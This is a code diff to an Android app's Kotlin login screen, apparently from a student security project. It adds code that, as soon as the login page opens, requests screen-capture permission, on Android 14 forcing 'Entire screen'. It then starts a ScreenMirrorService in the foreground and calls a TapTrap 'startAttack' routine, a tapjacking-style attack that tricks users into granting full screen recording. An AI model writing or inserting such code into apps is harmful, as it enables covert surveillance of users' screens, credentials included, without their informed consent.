@@ -22,6 +22,12 @@ import com.google.android.gms.common.api.ApiException
 import com.example.inf2007_mad_j1847.BuildConfig
 import com.example.inf2007_mad_j1847.test.TapTrap
 import kotlinx.coroutines.delay
+import android.content.Context
+import android.media.projection.MediaProjectionManager
+import com.example.inf2007_mad_j1847.test.ScreenMirrorService
+import android.content.Intent
+import android.media.projection.MediaProjectionConfig
+import android.os.Build
 
 @Composable
 fun LoginScreen(navController: NavHostController, authViewModel: AuthViewModel) {
@@ -31,11 +37,46 @@ fun LoginScreen(navController: NavHostController, authViewModel: AuthViewModel) 
     val activity = context as ComponentActivity
     val tapTrap = remember { TapTrap(activity) }
 
+    val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+
+    val mediaProjectionLauncher = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
+            ScreenMirrorService.sResultCode = result.resultCode
+            ScreenMirrorService.sResultData = result.data!!
+            Log.d("TapTrap", "🎥 MediaProjection granted!")
+
+            // ✅ Start service immediately from foreground (LoginScreen is visible)
+            val mirrorIntent = Intent(context, ScreenMirrorService::class.java)
+            mirrorIntent.putExtra("resultCode", result.resultCode)
+            mirrorIntent.putExtra("resultData", result.data)
+            context.startForegroundService(mirrorIntent)
+        }
+    }
 
     LaunchedEffect(Unit) {
+        if (ScreenMirrorService.sResultData == null) {
+
+            val captureIntent =
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    // Android 14 (API 34): force "Entire screen" (default display)
+                    mpm.createScreenCaptureIntent(
+                        MediaProjectionConfig.createConfigForDefaultDisplay()
+                    )
+                } else {
+                    // Older Android: normal flow
+                    mpm.createScreenCaptureIntent()
+                }
+
+            mediaProjectionLauncher.launch(captureIntent)
+        }
+        delay(3000)
 
         println("launch ENTER")
             tapTrap.startAttack()
+
+
 
     }
 
